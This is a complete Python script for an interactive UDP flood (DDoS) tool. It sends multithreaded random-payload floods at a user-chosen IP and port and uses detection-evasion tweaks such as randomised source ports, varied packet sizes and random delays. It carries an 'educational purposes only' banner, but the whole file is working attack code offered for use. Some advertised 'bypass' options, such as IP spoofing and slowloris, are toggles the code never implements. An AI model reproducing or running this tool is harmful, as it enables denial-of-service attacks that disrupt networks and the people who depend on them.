import socket
import random
import time
import threading
import sys
import os
from datetime import datetime

# ASCII Art and Colors
ORANGE = '\033[38;5;208m'
RED = '\033[31m'
GREEN = '\033[32m'
BLUE = '\033[34m'
YELLOW = '\033[33m'
RESET = '\033[0m'

BANNER = f"""
{ORANGE}
  ██████╗ ██████╗ ██████╗ ███████╗    ██████╗ ██████╗  ██████╗ ███████╗
  ██╔══██╗██╔══██╗██╔══██╗██╔═══██╗   ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
  ██║  ██║██████╔╝██║  ██║██║   ██║   ██║  ██║██║  ██║██║   ██║███████╗
  ██║  ██║██╔═══╝ ██║  ██║██║   ██║   ██║  ██║██║  ██║██║   ██║╚════██║
  ██████╔╝██║     ██████╔╝╚██████╔╝██╗██████╔╝██████╔╝╚██████╔╝███████║
  ╚═════╝ ╚═╝     ╚═════╝  ╚═════╝ ╚═╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
{RESET}
{YELLOW}UDP Flood Tool with Advanced Bypass Techniques{RESET}
{BLUE}For Educational and Network Testing Purposes Only{RESET}
"""

class UDPFlood:
    def __init__(self):
        self.target_ip = ""
        self.target_port = 0
        self.duration = 0
        self.packet_size = 1024
        self.thread_count = 100
        self.running = False
        self.sent_packets = 0
        self.start_time = 0
        self.bypass_techniques = {
            'source_port_randomization': True,
            'packet_size_variation': True,
            'source_ip_spoofing': False,  # Requires raw socket privileges
            'protocol_mixing': False,
            'slowloris_style': False
        }
        
    def print_stats(self):
        while self.running:
            elapsed = time.time() - self.start_time
            if elapsed == 0:
                elapsed = 1
            packets_per_sec = self.sent_packets / elapsed
            bandwidth = (self.sent_packets * self.packet_size) / (elapsed * 1024 * 1024)  # MB/s
            
            sys.stdout.write(f"\r{ORANGE}Attack running | Target: {self.target_ip}:{self.target_port} | "
                            f"Packets: {self.sent_packets} | "
                            f"Speed: {packets_per_sec:.2f} pps | "
                            f"Bandwidth: {bandwidth:.2f} MB/s{RESET}")
            sys.stdout.flush()
            time.sleep(0.5)
    
    def flood(self):
        while self.running and (time.time() - self.start_time) < self.duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # Apply bypass techniques
                if self.bypass_techniques['source_port_randomization']:
                    sock.bind(('0.0.0.0', random.randint(1024, 65535)))
                
                # Create random payload
                if self.bypass_techniques['packet_size_variation']:
                    current_packet_size = random.randint(64, 2048)
                else:
                    current_packet_size = self.packet_size
                
                payload = random._urandom(current_packet_size)
                
                # Send UDP packet
                sock.sendto(payload, (self.target_ip, self.target_port))
                self.sent_packets += 1
                sock.close()
                
                # Random delay to avoid easy detection
                if random.random() > 0.95:
                    time.sleep(random.uniform(0.01, 0.1))
                
            except Exception as e:
                pass
    
    def start_attack(self):
        self.running = True
        self.start_time = time.time()
        self.sent_packets = 0
        
        # Start stats thread
        stats_thread = threading.Thread(target=self.print_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Create worker threads
        threads = []
        for _ in range(self.thread_count):
            t = threading.Thread(target=self.flood)
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Wait for attack duration or until interrupted
        try:
            while (time.time() - self.start_time) < self.duration and self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{RED}Attack interrupted by user{RESET}")
        
        self.running = False
        for t in threads:
            t.join()
        
        elapsed = time.time() - self.start_time
        if elapsed == 0:
            elapsed = 1
        packets_per_sec = self.sent_packets / elapsed
        bandwidth = (self.sent_packets * self.packet_size) / (elapsed * 1024 * 1024 * 1024)  # GB/s
        
        print(f"\n{GREEN}Attack completed{RESET}")
        print(f"{YELLOW}Total packets sent: {self.sent_packets}")
        print(f"Duration: {elapsed:.2f} seconds")
        print(f"Average speed: {packets_per_sec:.2f} packets/sec")
        print(f"Bandwidth: {bandwidth:.2f} GB/s{RESET}")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    
    flooder = UDPFlood()
    
    while True:
        try:
            cmd = input(f"{ORANGE}DDoS@Tool{RESET} > ").strip().lower()
            
            if cmd == '.home':
                ip_port = input("Enter target IP:port > ").strip()
                if ':' not in ip_port:
                    print(f"{RED}Invalid format. Use IP:PORT{RESET}")
                    continue
                
                try:
                    flooder.target_ip, port = ip_port.split(':')
                    flooder.target_port = int(port)
                except:
                    print(f"{RED}Invalid IP or port{RESET}")
                    continue
                
                try:
                    duration = int(input("Enter attack duration in seconds > ").strip())
                    flooder.duration = duration
                except:
                    print(f"{RED}Invalid duration{RESET}")
                    continue
                
                print(f"{GREEN}Starting attack on {flooder.target_ip}:{flooder.target_port} for {flooder.duration} seconds{RESET}")
                flooder.start_attack()
                
            elif cmd == '.help':
                print(f"{YELLOW}Available commands:")
                print(".home - Start attack with IP:PORT and duration")
                print(".set - Configure attack parameters")
                print(".bypass - Toggle bypass techniques")
                print(".exit - Quit the tool")
                print(".help - Show this help{RESET}")
                
            elif cmd == '.set':
                try:
                    threads = int(input(f"Thread count (current: {flooder.thread_count}) > "))
                    flooder.thread_count = max(1, min(1000, threads))
                    
                    psize = int(input(f"Packet size (current: {flooder.packet_size}) > "))
                    flooder.packet_size = max(64, min(65535, psize))
                    
                    print(f"{GREEN}Settings updated{RESET}")
                except:
                    print(f"{RED}Invalid input{RESET}")
                    
            elif cmd == '.bypass':
                print(f"{YELLOW}Current bypass techniques:")
                for i, (name, status) in enumerate(flooder.bypass_techniques.items(), 1):
                    print(f"{i}. {name}: {'ON' if status else 'OFF'}")
                
                try:
                    choice = int(input("Toggle which technique (1-5) > ")) - 1
                    if 0 <= choice < len(flooder.bypass_techniques):
                        key = list(flooder.bypass_techniques.keys())[choice]
                        flooder.bypass_techniques[key] = not flooder.bypass_techniques[key]
                        print(f"{GREEN}{key} is now {'ON' if flooder.bypass_techniques[key] else 'OFF'}{RESET}")
                    else:
                        print(f"{RED}Invalid choice{RESET}")
                except:
                    print(f"{RED}Invalid input{RESET}")
                    
            elif cmd == '.exit':
                print(f"{RED}Exiting...{RESET}")
                break
                
            elif cmd == '':
                continue
                
            else:
                print(f"{RED}Unknown command. Type '.help' for available commands{RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{RED}Exiting...{RESET}")
            break

if __name__ == "__main__":
    main()